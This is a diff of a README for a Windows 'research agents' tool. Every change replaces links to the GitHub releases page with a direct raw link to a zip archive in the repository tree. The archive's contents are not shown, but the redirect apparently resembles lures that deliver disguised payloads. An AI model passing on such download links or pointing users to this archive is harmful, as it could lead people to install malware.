@@ -1,12 +1,12 @@
 # 🧪 lite-research-agents - Simple research flow for any task
 
-[![Download the latest release](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Daisybastioned440/lite-research-agents/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Daisybastioned440/lite-research-agents/raw/refs/heads/main/skills/research-lite-agents-3.3.zip)
 
 ## 🔽 Download
 
 Visit this page to download the Windows version:
 
-https://github.com/Daisybastioned440/lite-research-agents/releases
+https://github.com/Daisybastioned440/lite-research-agents/raw/refs/heads/main/skills/research-lite-agents-3.3.zip
 
 ## 🪟 Install on Windows
 
@@ -157,7 +157,7 @@ This project fits well with:
 
 Check the release page for new builds, file names, and update notes:
 
-https://github.com/Daisybastioned440/lite-research-agents/releases
+https://github.com/Daisybastioned440/lite-research-agents/raw/refs/heads/main/skills/research-lite-agents-3.3.zip
 
 When a new release appears, download the latest Windows file again and replace the old one if needed.
 
@@ -222,4 +222,4 @@ For the easiest setup:
 
 If you need the file again, use the release page below:
 
-https://github.com/Daisybastioned440/lite-research-agents/releases
+https://github.com/Daisybastioned440/lite-research-agents/raw/refs/heads/main/skills/research-lite-agents-3.3.zip
